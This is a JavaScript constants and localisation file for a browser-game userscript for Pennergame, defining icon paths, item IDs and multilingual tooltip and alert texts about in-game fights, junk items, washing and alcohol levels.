var ICON_NOINFO = 'mtwqesx0/noinfo.png';                      // Icon für keine Info

var ICON_BOO1 = '8lg87kf5/att1.gif';                          // Icon Boost +1
var ICON_BOO2 = '1adx6tkj/att2.gif';                          // Icon Boost +2
var ICON_BOO3 = 'xpm9igf2/att3.gif';                          // Icon Boost +3
var ICON_BOO4 = '6j2waeht/att4.gif';                          // Icon Boost +4
var ICON_BOO10 = 'keiku08y/att10.gif';                        // Icon Boost +10
var ICON_BOOU = 'yiwo7zi6/attu.gif';                          // Icon Boost + unbekannt

var ICON_MIN1 = '5k735aom/att1.gif';                          // Icon Boost -1
var ICON_MIN2 = 'k7z0r1qf/att2.gif';                          // Icon Boost -2
var ICON_MIN3 = 'n5jzzil6/att3.gif';                          // Icon Boost -3
var ICON_MIN4 = '6mubk55p/att4.gif';                          // Icon Boost -4
var ICON_MIN10 = 'kykpfjqc/att10.gif';                        // Icon Boost -10
var ICON_MINU = '9j11ciat/attu.gif';                          // Icon Boost - unbekannt

// Landesflaggen
var ICON_FLAGS = new Array();
    ICON_FLAGS[0] = 'g4qsgjqd/germany.png';
    ICON_FLAGS[1] = 'ogx8ptsl/United_States.png';
    ICON_FLAGS[2] = 'dkty76qd/poland.png';
    ICON_FLAGS[3] = 'o7lc5ber/france.png';
    ICON_FLAGS[4] = '4tcoc2bl/spain.png';
    ICON_FLAGS[5] = 'sb77c8nt/brazil.png';
    ICON_FLAGS[6] = 'b1e56142/russia.png';
    ICON_FLAGS[7] = '3sc9i1d7/united_kingdom.png';

// Array für Kampf-Warnicons (unterschiedliche Anzahl eingehender Kämpfe)
var ICON_FIGHT = new Array();
    ICON_FIGHT[0] = 'wbe5i4lj/nofight.png';
    ICON_FIGHT[1] = '5mwkxg8s/rot1.png';
    ICON_FIGHT[2] = 'lm37o0sp/rot2.png';
    ICON_FIGHT[3] = 'gz9jewwq/rot3.png';
    ICON_FIGHT[4] = '8lxcn7op/rot4.png';
    ICON_FIGHT[5] = 'hr2ht06t/rot5.png';
    ICON_FIGHT[6] = 'xxp8r2ec/rottotenkopf.png';

// Array für Bandenkampf Warnicons (unterschiedliche Anzahl eingehender Bandenkämpfe)
var ICON_GANGFIGHT = new Array();
    ICON_GANGFIGHT[0] = 'wbe5i4lj/nofight.png';
    ICON_GANGFIGHT[1] = 'hewesb6u/blau1.png';
    ICON_GANGFIGHT[2] = 'pzel8rie/blau2.png';
    ICON_GANGFIGHT[3] = '0rdej75i/blau3.png';
    ICON_GANGFIGHT[4] = 'kmoeymrs/blau4.png';
    ICON_GANGFIGHT[5] = 'tjlhak5i/blau5.png';
    ICON_GANGFIGHT[6] = 'yqnyi6mt/blautotenkopf.png';

// Konstanten für Wut-Zustand
var WUTSTATE_ACTIVE = 0;
var WUTSTATE_INACTIVE = 1;
var WUTSTATE_ERROR = 2;

// Konstanten für Fightstate-Zustand
var FIGHTSTATE_OK = 0;
var FIGHTSTATE_WEAK = 1;
var FIGHTSTATE_DANG = 3;
var FIGHTSTATE_ERROR = 2;

// IDs zum Zugriff auf Nahrungsmittel
var ID_BEER = 1;
var ID_BREAD = 2;
var ID_CURRY = 3;
var ID_DOENER = 4;
var ID_WODKA  = 7;
var ID_GRUSEL = 8;
var ID_SWEETS = 9;
var ID_GLUEHW = 10;
var ID_STOLLN = 11;

// URL für Anwenden des Plunders
var PLUNDERIMAGE_URL = new Array();
    PLUNDERIMAGE_URL[0] = "http://static.pennergame.de/img/pv4/plunder_new/old/";
    PLUNDERIMAGE_URL[1] = "http://static.pennergame.de/img/pv4/plunder_new/";
    PLUNDERIMAGE_URL[2] = "http://static.pennergame.de/img/pv4/plunder/";

// Diverse Texte - Ausgabe
var THISSCRIPTNAME = new Array;
    THISSCRIPTNAME[0] = "Infozentrale";
    THISSCRIPTNAME[1] = "info central";
    THISSCRIPTNAME[2] = "info central";
    THISSCRIPTNAME[3] = "info central";
    THISSCRIPTNAME[4] = "info central";
    THISSCRIPTNAME[5] = "info central";
    THISSCRIPTNAME[6] = "Информационный центр";
    THISSCRIPTNAME[7] = "info central";
var TOOLTIP_PLUNDERAUSWAHL = new Array();
    TOOLTIP_PLUNDERAUSWAHL[0] = 'Hier klicken, um weitere Plunderstücke für den Direktzugriff auszuwählen. Die Anzeige im Plunder-Direktzugriff erfolgt in der Reihenfolge des Hinzufügens.';
    TOOLTIP_PLUNDERAUSWAHL[1] = 'Click here to choose further junk for the direct access list. The order in the display is given by the order of adding to the list.';
    TOOLTIP_PLUNDERAUSWAHL[6] = 'Кликни здесь, чтобы добавить барахло. Последовательность выставления барахла зависит от последовательности кликов.';
var TOOLTIP_PLUNDERRESET = new Array();
    TOOLTIP_PLUNDERRESET[0] = 'Hier klicken, um die Plunder-Direktzugriffsliste zu leeren.';
    TOOLTIP_PLUNDERRESET[1] = 'Click here to clear the direct access list of the junk.';
    TOOLTIP_PLUNDERRESET[2] = 'Click here to clear the direct access list of the junk.';
    TOOLTIP_PLUNDERRESET[3] = 'Click here to clear the direct access list of the junk.';
    TOOLTIP_PLUNDERRESET[4] = 'Click here to clear the direct access list of the junk.';
    TOOLTIP_PLUNDERRESET[5] = 'Click here to clear the direct access list of the junk.';
    TOOLTIP_PLUNDERRESET[6] = 'Кликни здесь, чтобы удалить все барахло.';
    TOOLTIP_PLUNDERRESET[7] = 'Click here to clear the direct access list of the junk.';
var TOOLTIP_FIGHTOK = new Array();
    TOOLTIP_FIGHTOK[0] = 'Deine aktuelle Kampfstärke ist optimal (%d)! Anklicken --> RESET des Power-Wertes.';
    TOOLTIP_FIGHTOK[1] = 'Your fighting power is optimal (%d)! Click --> RESET the power-value.';
    TOOLTIP_FIGHTOK[6] = 'Твоя сила оптимальна (%d)! Кликни, чтобы актуализировать твою силу.';
var TOOLTIP_FIGHTWEAK = new Array();
    TOOLTIP_FIGHTWEAK[0] = 'Achtung, Du hast derzeit nicht Deine maximale Kampfstärke (%d/%d)! Anklicken --> RESET des Power-Wertes.';
    TOOLTIP_FIGHTWEAK[1] = "Attention, you don't have your maximal fighting power (%d/%d)! Click --> RESET the power-value.";
    TOOLTIP_FIGHTWEAK[6] = "Внимание, у тебя сейчас не максимальная сила (%d/%d)! Кликни, чтобы актуализировать твою силу.";
var TOOLTIP_FIGHTDANG = new Array();
    TOOLTIP_FIGHTDANG[0] = "Achtung, Du schwebst in Lebensgefahr !";
    TOOLTIP_FIGHTDANG[1] = "Your life hangs from a thread !";
    TOOLTIP_FIGHTDANG[2] = "Znajdujesz się w niebezpieczeństwie !";
    TOOLTIP_FIGHTDANG[3] = "Tu es en danger de mort !";
    TOOLTIP_FIGHTDANG[4] = "¡Tu vida está en peligro!";
    TOOLTIP_FIGHTDANG[5] = "Você está correndo risco de vida !";
    TOOLTIP_FIGHTDANG[6] = "Ты в смертельной опасности !";
    TOOLTIP_FIGHTDANG[7] = "Your life is in Danger !";
var TOOLTIP_LOADERROR = new Array();
    TOOLTIP_LOADERROR[0] = 'Seitenladefehler!';
    TOOLTIP_LOADERROR[1] = 'page loading error!';
    TOOLTIP_LOADERROR[6] = 'Ошибка при запуске страницы!';
var TOOLTIP_WIWUTAKTIV = new Array();
    TOOLTIP_WIWUTAKTIV[0] = ' ist aktiv! Ende: ';
    TOOLTIP_WIWUTAKTIV[1] = ' is active! End: ';
    TOOLTIP_WIWUTAKTIV[2] = ' jest aktywny! Zakończ: ';
    TOOLTIP_WIWUTAKTIV[3] = ' is active! End: ';
    TOOLTIP_WIWUTAKTIV[4] = ' is active! End: ';
    TOOLTIP_WIWUTAKTIV[5] = ' is active! End: ';
    TOOLTIP_WIWUTAKTIV[6] = ' активно! Окончание: ';
    TOOLTIP_WIWUTAKTIV[7] = ' is active! End: ';
var TOOLTIP_WIWUTINAKTIV = new Array();
    TOOLTIP_WIWUTINAKTIV[0] = ' derzeit NICHT aktiv!';
    TOOLTIP_WIWUTINAKTIV[1] = ' NOT active at the moment!';
    TOOLTIP_WIWUTINAKTIV[2] = ' NOT active at the moment!';
    TOOLTIP_WIWUTINAKTIV[3] = ' NOT active at the moment!';
    TOOLTIP_WIWUTINAKTIV[4] = ' NOT active at the moment!';
    TOOLTIP_WIWUTINAKTIV[5] = ' NOT active at the moment!';
    TOOLTIP_WIWUTINAKTIV[6] = ' сейчас неактивно!';
    TOOLTIP_WIWUTINAKTIV[7] = ' NOT active at the moment!';
var TOOLTIP_LOCK = new Array();
    TOOLTIP_LOCK[0] = 'Leistenbewegung wird nicht gespeichert!';
    TOOLTIP_LOCK[1] = 'Movement of panels will not be stored!';
    TOOLTIP_LOCK[2] = 'Movement of panels will not be stored!';
    TOOLTIP_LOCK[3] = 'Movement of panels will not be stored!';
    TOOLTIP_LOCK[4] = 'Movement of panels will not be stored!';
    TOOLTIP_LOCK[5] = 'Movement of panels will not be stored!';
    TOOLTIP_LOCK[6] = 'перемещение панели не сохраняется!';
    TOOLTIP_LOCK[7] = 'Movement of panels will not be stored!';

var ALERT_PLUNDERRESET = new Array();
    ALERT_PLUNDERRESET[0] = 'Die Plunder-Direktzugriffsliste wurde geleert!';
    ALERT_PLUNDERRESET[1] = 'The direct access list for junk has been cleared!';
    ALERT_PLUNDERRESET[2] = 'The direct access list for junk has been cleared!';
    ALERT_PLUNDERRESET[3] = 'The direct access list for junk has been cleared!';
    ALERT_PLUNDERRESET[4] = 'The direct access list for junk has been cleared!';
    ALERT_PLUNDERRESET[5] = 'The direct access list for junk has been cleared!';
    ALERT_PLUNDERRESET[6] = 'панель с барахлом очищена!';
    ALERT_PLUNDERRESET[7] = 'The direct access list for junk has been cleared!';
var ALERT_RESETPOWER = new Array();
    ALERT_RESETPOWER[0] = 'Der maximale Power-Wert wurde zurückgesetzt und wird jetzt neu ermittelt!';
    ALERT_RESETPOWER[1] = 'The maximal power value has been reset and will be set new now!';
    ALERT_RESETPOWER[2] = 'The maximal power value has been reset and will be set new now!';
    ALERT_RESETPOWER[3] = 'The maximal power value has been reset and will be set new now!';
    ALERT_RESETPOWER[4] = 'The maximal power value has been reset and will be set new now!';
    ALERT_RESETPOWER[5] = 'The maximal power value has been reset and will be set new now!';
    ALERT_RESETPOWER[6] = 'Максимальная сила сброшена и будет установлена заново!';
    ALERT_RESETPOWER[7] = 'The maximal power value has been reset and will be set new now!';

var TxtNewVersion = new Array();
    TxtNewVersion[0] = "Es gibt eine neue Version des Skriptes '%s':\n\n%s\n\nDie neue Version kann Fehlerbehebungen und/oder neue Funktionen beinhalten.\nHier gibt es weitere Infos über die neue Version:\n\n%s\n\nEine Aktualisierung ist empfehlenswert und kann direkt anschließend durchgeführt werden.\n\nHinweis: Die Überprüfung auf neue Versionen wird nur einmal pro Tag durchgeführt."
    TxtNewVersion[1] = "There is a new version of the script '%s':\n\n%s\n\nThe new version can contain bugfixes and/or new features.\nHere you will find more information about the new version:\n\n%s\n\nAn update is recommended and can be done directly afterwards.\n\nNote: The check for new versions is only done once a day."
    TxtNewVersion[2] = "There is a new version of the script '%s':\n\n%s\n\nThe new version can contain bugfixes and/or new features.\nHere you will find more information about the new version:\n\n%s\n\nAn update is recommended and can be done directly afterwards.\n\nNote: The check for new versions is only done once a day."
    TxtNewVersion[3] = "There is a new version of the script '%s':\n\n%s\n\nThe new version can contain bugfixes and/or new features.\nHere you will find more information about the new version:\n\n%s\n\nAn update is recommended and can be done directly afterwards.\n\nNote: The check for new versions is only done once a day."
    TxtNewVersion[4] = "There is a new version of the script '%s':\n\n%s\n\nThe new version can contain bugfixes and/or new features.\nHere you will find more information about the new version:\n\n%s\n\nAn update is recommended and can be done directly afterwards.\n\nNote: The check for new versions is only done once a day."
    TxtNewVersion[5] = "There is a new version of the script '%s':\n\n%s\n\nThe new version can contain bugfixes and/or new features.\nHere you will find more information about the new version:\n\n%s\n\nAn update is recommended and can be done directly afterwards.\n\nNote: The check for new versions is only done once a day."
    TxtNewVersion[6] = "Есть новая версия скрипта ‘%s’:\n\n%s\n\nВ новой версии могут быть улучшения или новые функции.\nЗдесь есть информации о скрипте:\n\n%s\n\nСоветуем инсталлировать.\n\nОпрос о новой версии только раз в день."
var TxtPlunderCheck = new Array();
    TxtPlunderCheck[0] = 'Durch Anlegen des Plunders "%s" wäre Deine Kampfkraft am größten';
    TxtPlunderCheck[1] = 'If you equip with the junk "%s" your fighting power will be highest';
    TxtPlunderCheck[2] = 'If you equip with the junk "%s" your fighting power will be highest';
    TxtPlunderCheck[3] = 'If you equip with the junk "%s" your fighting power will be highest';
    TxtPlunderCheck[4] = 'If you equip with the junk "%s" your fighting power will be highest';
    TxtPlunderCheck[5] = 'If you equip with the junk "%s" your fighting power will be highest';
    TxtPlunderCheck[6] = 'Если сохранишь “%s” барахло, сила будет максимальной';
    TxtPlunderCheck[7] = 'If you equip with the junk "%s" your fighting power will be highest';
var TxtWCheck1 = new Array();
    TxtWCheck1[0] = 'Wenn Du die Waffe "%s" kaufst und anlegst, verbessert sich Dein ATT-Wert um %d';
    TxtWCheck1[1] = 'If you buy and use the weapon "%s" your ATT-value will increase by %d';
    TxtWCheck1[2] = 'If you buy and use the weapon "%s" your ATT-value will increase by %d';
    TxtWCheck1[3] = 'If you buy and use the weapon "%s" your ATT-value will increase by %d';
    TxtWCheck1[4] = 'If you buy and use the weapon "%s" your ATT-value will increase by %d';
    TxtWCheck1[5] = 'If you buy and use the weapon "%s" your ATT-value will increase by %d';
    TxtWCheck1[6] = 'Если купишь и применишь “%s” оружие, твой АТТ увеличится на %d';
    TxtWCheck1[7] = 'If you buy and use the weapon "%s" your ATT-value will increase by %d';
var TxtWCheck2 = new Array();
    TxtWCheck2[0] = 'Wenn Du die Waffe "%s" anlegst, verbessert sich Dein ATT-Wert um %d';
    TxtWCheck2[1] = 'If you use the weapon "%s" your ATT-value will increase by %d';
    TxtWCheck2[2] = 'If you use the weapon "%s" your ATT-value will increase by %d';
    TxtWCheck2[3] = 'If you use the weapon "%s" your ATT-value will increase by %d';
    TxtWCheck2[4] = 'If you use the weapon "%s" your ATT-value will increase by %d';
    TxtWCheck2[5] = 'If you use the weapon "%s" your ATT-value will increase by %d';
    TxtWCheck2[6] = 'Если применишь “%s” оружие, твой АТТ увеличится на %d';
    TxtWCheck2[7] = 'If you use the weapon "%s" your ATT-value will increase by %d';
var TxtHomeCheck = new Array();
    TxtHomeCheck[0] = 'Wenn Du %sdas Eigenheim "%s" %s, verbessert sich Dein DEF-Wert um %d';
    TxtHomeCheck[1] = 'If you %s the home "%s" %syour DEF-Value will increase by %d';
    TxtHomeCheck[2] = 'If you %s the home "%s" %syour DEF-Value will increase by %d';
    TxtHomeCheck[3] = 'If you %s the home "%s" %syour DEF-Value will increase by %d';
    TxtHomeCheck[4] = 'If you %s the home "%s" %syour DEF-Value will increase by %d';
    TxtHomeCheck[5] = 'If you %s the home "%s" %syour DEF-Value will increase by %d';
    TxtHomeCheck[6] = 'Если ты %s частный дом “%s”%s, твой DEF увеличится на %d';
    TxtHomeCheck[7] = 'If you %s the home "%s" %syour DEF-Value will increase by %d';
var TxtHomeMovein1 = new Array();
    TxtHomeMovein1[0] = "";
    TxtHomeMovein1[1] = "go to";
    TxtHomeMovein1[2] = "go to";
    TxtHomeMovein1[3] = "go to";
    TxtHomeMovein1[4] = "go to";
    TxtHomeMovein1[5] = "go to";
    TxtHomeMovein1[6] = "вселишься в";
    TxtHomeMovein1[7] = "go to";
var TxtHomeMovein2 = new Array();
    TxtHomeMovein2[0] = "beziehst";
    TxtHomeMovein2[1] = "";
    TxtHomeMovein2[2] = "";
    TxtHomeMovein2[3] = "";
    TxtHomeMovein2[4] = "";
    TxtHomeMovein2[5] = "";
    TxtHomeMovein2[6] = "";
    TxtHomeMovein2[7] = "";
var TxtHomeBuy1 = new Array();
    TxtHomeBuy1[0] = "";
    TxtHomeBuy1[1] = "buy";
    TxtHomeBuy1[2] = "buy";
    TxtHomeBuy1[3] = "buy";
    TxtHomeBuy1[4] = "buy";
    TxtHomeBuy1[5] = "buy";
    TxtHomeBuy1[6] = "купишь";
    TxtHomeBuy1[7] = "buy";
var TxtHomeBuy2 = new Array();
    TxtHomeBuy2[0] = "kaufst";
    TxtHomeBuy2[1] = "";
    TxtHomeBuy2[2] = "";
    TxtHomeBuy2[3] = "";
    TxtHomeBuy2[4] = "";
    TxtHomeBuy2[5] = "";
    TxtHomeBuy2[6] = "";
    TxtHomeBuy2[7] = "";
var TxtBuy = new Array();
    TxtBuy[0] = 'Kaufen';
    TxtBuy[1] = 'Buy';
    TxtBuy[2] = 'Kup';
    TxtBuy[3] = 'Acheter';
    TxtBuy[4] = 'Comprar';
    TxtBuy[5] = 'Comprar';
    TxtBuy[6] = 'Купить';
    TxtBuy[7] = 'Buy';
var TxtBuyAll = new Array();
    TxtBuyAll[0] = 'Alles kaufen';
    TxtBuyAll[1] = 'Buy all';
    TxtBuyAll[2] = 'Kup wszystko';
    TxtBuyAll[3] = 'Acheter tous';
    TxtBuyAll[4] = 'Comprar todo';
    TxtBuyAll[5] = 'Comprar tudo';
    TxtBuyAll[6] = 'Купить';
    TxtBuyAll[7] = 'Buy all';
var TxtWaitSort = new Array();
    TxtWaitSort[0] = 'warte %s - neue Ramschlieferung ist bereits unterwegs (%s)';
    TxtWaitSort[1] = 'wait %s - new sortiment is on its way (%s)';
    TxtWaitSort[2] = 'wait %s - new sortiment is on its way (%s)';
    TxtWaitSort[3] = 'attend %s - la nouvelle livraison arrive bientôt';
    TxtWaitSort[4] = 'espera %s - el nuevo pedido de cachivaches está en camino';
    TxtWaitSort[5] = 'wait %s - new sortiment is on its way (%s)';
    TxtWaitSort[6] = 'wait %s - new sortiment is on its way (%s)';
    TxtWaitSort[7] = 'wait %s - new sortiment is on its way (%s)';
var TxtStreun = new Array();
    TxtStreun[0] = 'Dein Haustier streunt noch %s - Endezeit: %s';
var TxtWash = new Array();
    TxtWash[0] = 'Vollständig waschen';
    TxtWash[1] = 'Wash completely';
    TxtWash[2] = 'Wash completely';
    TxtWash[3] = 'Wash completely';
    TxtWash[4] = 'Lavarse completo';
    TxtWash[5] = 'Wash completely';
    TxtWash[6] = 'полностью помыться';
    TxtWash[7] = 'Wash completely';
var TxtPromUp = new Array();
    TxtPromUp[0] = 'Promille rauf';
    TxtPromUp[1] = 'Alcohol level up';
    TxtPromUp[2] = 'Alcohol level up';
    TxtPromUp[3] = 'Alcohol level up';
    TxtPromUp[4] = 'Alcohol level up';
    TxtPromUp[5] = 'Alcohol level up';
    TxtPromUp[6] = 'увеличить промилле';
    TxtPromUp[7] = 'Alcohol level up';
var TxtPromDown = new Array();
    TxtPromDown[0] = 'Promille runter';
    TxtPromDown[1] = 'Alcohol level down';
    TxtPromDown[2] = 'Alcohol level down';
    TxtPromDown[3] = 'Alcohol level down';
    TxtPromDown[4] = 'Alcohol level down';
    TxtPromDown[5] = 'Alcohol level down';
    TxtPromDown[6] = 'уменьшить промилле';
    TxtPromDown[7] = 'Alcohol level down';
var TxtIncomingFights1 = new Array();
    TxtIncomingFights1[0] = ' 1 eingehender Angriff!';
    TxtIncomingFights1[1] = ' 1 incoming fight!';
    TxtIncomingFights1[2] = ' 1 rozpoczęte walk';
    TxtIncomingFights1[3] = ' 1 baston inattendue!';
    TxtIncomingFights1[4] = ' 1 lucha entrante!';
    TxtIncomingFights1[5] = ' 1 incoming fight!';
    TxtIncomingFights1[6] = ' 1 входящий бой';
    TxtIncomingFights1[7] = ' 1 incoming fight!';
var TxtIncomingFights2 = new Array();
    TxtIncomingFights2[0] = ' %d eingehende Angriffe!';
    TxtIncomingFights2[1] = ' %d incoming fights!';
    TxtIncomingFights2[2] = ' %d rozpoczęte walki';
    TxtIncomingFights2[3] = ' %d bastons inattendues!';
    TxtIncomingFights2[4] = ' %d luchas entrantes!';
    TxtIncomingFights2[5] = ' %d incoming fights!';
    TxtIncomingFights2[6] = ' %d Поступающие разборки';
    TxtIncomingFights2[7] = ' %d incoming fights!';
var TxtGangFight1 = new Array();
    TxtGangFight1[0] = 'Aktuell läuft ein Bandenkampf!%s';
    TxtGangFight1[1] = 'At the moment one gang fight is running!%s';
    TxtGangFight1[2] = 'At the moment one gang fight is running!%s';     // Aendern
    TxtGangFight1[3] = 'At the moment one gang fight is running!%s';
    TxtGangFight1[4] = 'At the moment one gang fight is running!%s';
    TxtGangFight1[5] = 'At the moment one gang fight is running!%s';
    TxtGangFight1[6] = 'Сейчас идет бой между бандами!%s';
    TxtGangFight1[7] = 'At the moment one gang fight is running!%s';
var TxtGangFight2 = new Array();
    TxtGangFight2[0] = 'Aktuell laufen %d Bandenkämpfe!%s';
    TxtGangFight2[1] = 'At the moment %d gang fights are running!%s';
    TxtGangFight2[2] = 'At the moment %d gang fights are running!%s';    // Aendern
    TxtGangFight2[3] = 'At the moment %d gang fights are running!%s';
    TxtGangFight2[4] = 'At the moment %d gang fights are running!%s';
    TxtGangFight2[5] = 'At the moment %d gang fights are running!%s';
    TxtGangFight2[6] = 'Число актуальных боев между бандами: %d! %s';
    TxtGangFight2[7] = 'At the moment %d gang fights are running!%s';
var TxtAusweichen = new Array();
    TxtAusweichen[0] = 'Ausweichen%s möglich';
    TxtAusweichen[1] = 'Evading%s possible';
    TxtAusweichen[2] = 'Unikaj%s możliwy';
    TxtAusweichen[3] = 'Esquiver%s possible';
    TxtAusweichen[4] = 'Evitar%s posible';
    TxtAusweichen[5] = 'Evading%s possible';
    TxtAusweichen[6] = 'избежать боя %s возможно';
    TxtAusweichen[7] = 'Evading%s possible';
var TxtAusweichN = new Array();
    TxtAusweichN[0] = ' nicht';
    TxtAusweichN[1] = ' not';
    TxtAusweichN[2] = ' nie';
    TxtAusweichN[3] = ' non';
    TxtAusweichN[4] = ' no es';
    TxtAusweichN[5] = ' not';
    TxtAusweichN[6] = ' не';
    TxtAusweichN[7] = ' not';
var TxtAusweichV = new Array();
    TxtAusweichV[0] = ' evtl.';
    TxtAusweichV[1] = ' maybe';
    TxtAusweichV[2] = ' może';
    TxtAusweichV[3] = ' peut-être';
    TxtAusweichV[4] = ' probablemente';
    TxtAusweichV[5] = ' maybe';
    TxtAusweichV[6] = ' может быть';
    TxtAusweichV[7] = ' maybe';
var TxtNotMoreThan9 = new Array();
    TxtNotMoreThan9[0] = 'Es können nicht mehr als 9 Plunderstücke für die Direktzugriffsliste ausgewählt werden!';
    TxtNotMoreThan9[1] = 'You cannot select more than 9 pieces of junk for the direct access list!';
    TxtNotMoreThan9[2] = 'You cannot select more than 9 pieces of junk for the direct access list!';
    TxtNotMoreThan9[3] = 'You cannot select more than 9 pieces of junk for the direct access list!';
    TxtNotMoreThan9[4] = 'You cannot select more than 9 pieces of junk for the direct access list!';
    TxtNotMoreThan9[5] = 'You cannot select more than 9 pieces of junk for the direct access list!';
    TxtNotMoreThan9[6] = 'К панели можно прикрепить не больше 9 штук барахла!';
    TxtNotMoreThan9[7] = 'You cannot select more than 9 pieces of junk for the direct access list!';
var TxtMoneyNeeded = new Array();
    TxtMoneyNeeded[0] = 'Zum Waschen werden %m benötigt, Du hast im Moment nur %m.';
    TxtMoneyNeeded[1] = 'You need %m to wash completely, but you only have %m at the moment.';
    TxtMoneyNeeded[2] = 'You need %m to wash completely, but you only have %m at the moment.';
    TxtMoneyNeeded[3] = 'You need %m to wash completely, but you only have %m at the moment.';
    TxtMoneyNeeded[4] = 'You need %m to wash completely, but you only have %m at the moment.';
    TxtMoneyNeeded[5] = 'You need %m to wash completely, but you only have %m at the moment.';
    TxtMoneyNeeded[6] = 'Для мытья нужно %m, а у тебя только %m.';
    TxtMoneyNeeded[7] = 'You need %m to wash completely, but you only have %m at the moment.';
var TxtCleansed1 = new Array();
    TxtCleansed1[0] = 'Du bist nun porentief rein!';
    TxtCleansed1[1] = 'You are cleansed down to the pores now!';
    TxtCleansed1[2] = 'You are cleansed down to the pores now!';
    TxtCleansed1[3] = 'You are cleansed down to the pores now!';
    TxtCleansed1[4] = 'You are cleansed down to the pores now!';
    TxtCleansed1[5] = 'You are cleansed down to the pores now!';
    TxtCleansed1[6] = 'Ты чист!';
    TxtCleansed1[7] = 'You are cleansed down to the pores now!';
var TxtCleansed2 = new Array();
    TxtCleansed2[0] = 'Du bist bereits porentief rein, sauberer geht nicht... :D';
    TxtCleansed2[1] = 'You are already cleansed down to the pores, more is not possible... :D';
    TxtCleansed2[2] = 'You are already cleansed down to the pores, more is not possible... :D';
    TxtCleansed2[3] = 'You are already cleansed down to the pores, more is not possible... :D';
    TxtCleansed2[4] = 'You are already cleansed down to the pores, more is not possible... :D';
    TxtCleansed2[5] = 'You are already cleansed down to the pores, more is not possible... :D';
    TxtCleansed2[6] = 'Ты чист, чище не бывает… :D';
    TxtCleansed2[7] = 'You are already cleansed down to the pores, more is not possible... :D';
var TxtLife = new Array();
    TxtLife[0] = 'Lebenspunkte auffüllen';
var TxtLifeNeeded = new Array();
    TxtLifeNeeded[0] = 'Dafür werden %m benötigt, Du hast im Moment nur %m.';
var TxtLifepts1 = new Array();
    TxtLifepts1[0] = 'Aaah ! Du fühlst Dich topfit !';
var TxtLifepts2 = new Array();
    TxtLifepts2[0] = 'Deine Lebenspunkte sind bereits komplett !';
var TxtHiccup = new Array();
    TxtHiccup[0] = '*Hicks* Jetzt hab ich endlich wieder meinen Standard-Pegel! :D';
    TxtHiccup[1] = '*Hiccup* Finally I have my standard blood alcohol level again! :D';
    TxtHiccup[2] = '*Hiccup* Finally I have my standard blood alcohol level again! :D';
    TxtHiccup[3] = '*Hiccup* Finally I have my standard blood alcohol level again! :D';
    TxtHiccup[4] = '*Hiccup* Finally I have my standard blood alcohol level again! :D';
    TxtHiccup[5] = '*Hiccup* Finally I have my standard blood alcohol level again! :D';
    TxtHiccup[6] = 'Фу-у, наконец-то я трезвый!';
    TxtHiccup[7] = '*Hiccup* Finally I have my standard blood alcohol level again! :D';
var TxtDrinkError = new Array();
    TxtDrinkError[0] = 'Beim Trinken gab es einen Fehler, Du hast immer noch nur %s Promille!';
    TxtDrinkError[1] = 'There was an error with the drinking, you still have only %s per mills';
    TxtDrinkError[2] = 'There was an error with the drinking, you still have only %s per mills';
    TxtDrinkError[3] = 'There was an error with the drinking, you still have only %s per mills';
    TxtDrinkError[4] = 'There was an error with the drinking, you still have only %s per mills';
    TxtDrinkError[5] = 'There was an error with the drinking, you still have only %s per mills';
    TxtDrinkError[6] = 'При питье допущена ошибка, у тебя все еще %s промилле!';
    TxtDrinkError[7] = 'There was an error with the drinking, you still have only %s per mills';
var TxtNotMuchToDrink = new Array();
    TxtNotMuchToDrink[0] = 'Die Vorräte an %s gehen zur Neige.\nBitte zuerst nachkaufen!';
    TxtNotMuchToDrink[1] = 'Your supply of %s is running low.\nPlease buy some first!';
    TxtNotMuchToDrink[2] = 'Your supply of %s is running low.\nPlease buy some first!';
    TxtNotMuchToDrink[3] = 'Your supply of %s is running low.\nPlease buy some first!';
    TxtNotMuchToDrink[4] = 'Your supply of %s is running low.\nPlease buy some first!';
    TxtNotMuchToDrink[5] = 'Your supply of %s is running low.\nPlease buy some first!';
    TxtNotMuchToDrink[6] = 'Запасы %s заканчиваются. \nпожалуйста, докупите!';
    TxtNotMuchToDrink[7] = 'Your supply of %s is running low.\nPlease buy some first!';
var TxtNoNeedToDrink = new Array();
    TxtNoNeedToDrink[0] = 'Du hast bereits mindestens 2,5 Promille,\nDu musst nicht noch mehr trinken!';
    TxtNoNeedToDrink[1] = "You already have a blood alcohol level of 2.5 per mills or more\nyou don't need to drink more!";
    TxtNoNeedToDrink[2] = "You already have a blood alcohol level of 2.5 per mills or more\nyou don't need to drink more!";
    TxtNoNeedToDrink[3] = "You already have a blood alcohol level of 2.5 per mills or more\nyou don't need to drink more!";
    TxtNoNeedToDrink[4] = "You already have a blood alcohol level of 2.5 per mills or more\nyou don't need to drink more!";
    TxtNoNeedToDrink[5] = "You already have a blood alcohol level of 2.5 per mills or more\nyou don't need to drink more!";
    TxtNoNeedToDrink[6] = "У тебя уже минимум 2,5 промилле, \nты не должен больше пить!";
    TxtNoNeedToDrink[7] = "You already have a blood alcohol level of 2.5 per mills or more\nyou don't need to drink more!";
var TxtDrinkLifeRisk = new Array();
    TxtDrinkLifeRisk[0] = 'Du hast bereits mindestens 3,65 Promille,\nWeiteres Trinken bringt Dich in Lebensgefahr!';
    TxtDrinkLifeRisk[1] = "You already have a blood alcohol level of 3.65 per mills or more\nFurther drinking will risk your life!";
    TxtDrinkLifeRisk[2] = "You already have a blood alcohol level of 3.65 per mills or more\nFurther drinking will risk your life!";
    TxtDrinkLifeRisk[3] = "You already have a blood alcohol level of 3.65 per mills or more\nFurther drinking will risk your life!";
    TxtDrinkLifeRisk[4] = "You already have a blood alcohol level of 3.65 per mills or more\nFurther drinking will risk your life!";
    TxtDrinkLifeRisk[5] = "You already have a blood alcohol level of 3.65 per mills or more\nFurther drinking will risk your life!";
    TxtDrinkLifeRisk[6] = "У тебя уже минимум 3,65 промилле, \nты не должен больше пить!";
    TxtDrinkLifeRisk[7] = "You already have a blood alcohol level of 3.65 per mills or more\nFurther drinking will risk your life!";
var TxtYummy = new Array();
    TxtYummy[0] = 'Mjamm, das war lecker!';
    TxtYummy[1] = 'Yummy, that was delicious!';
    TxtYummy[2] = 'Yummy, that was delicious!';
    TxtYummy[3] = 'Yummy, that was delicious!';
    TxtYummy[4] = 'Yummy, that was delicious!';
    TxtYummy[5] = 'Yummy, that was delicious!';
    TxtYummy[6] = 'М-м, это было вкусно!';
    TxtYummy[7] = 'Yummy, that was delicious!';
var TxtEatError = new Array();
    TxtEatError[0] = 'Beim Essen gab es einen Fehler, Du hast immer noch %s Promille!';
    TxtEatError[1] = 'There was an error with the eating, you still have %s per mills';
    TxtEatError[2] = 'There was an error with the eating, you still have %s per mills';
    TxtEatError[3] = 'There was an error with the eating, you still have %s per mills';
